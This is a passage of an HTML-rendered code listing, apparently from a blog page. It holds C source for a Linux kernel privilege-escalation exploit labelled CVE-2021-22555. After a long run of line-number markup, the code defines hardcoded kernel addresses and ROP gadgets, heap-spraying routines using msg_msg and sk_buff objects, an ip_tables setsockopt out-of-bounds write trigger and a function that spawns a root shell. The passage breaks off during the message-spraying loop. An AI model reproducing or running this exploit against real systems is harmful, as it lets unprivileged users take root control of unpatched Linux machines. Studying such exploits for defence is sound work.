class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span 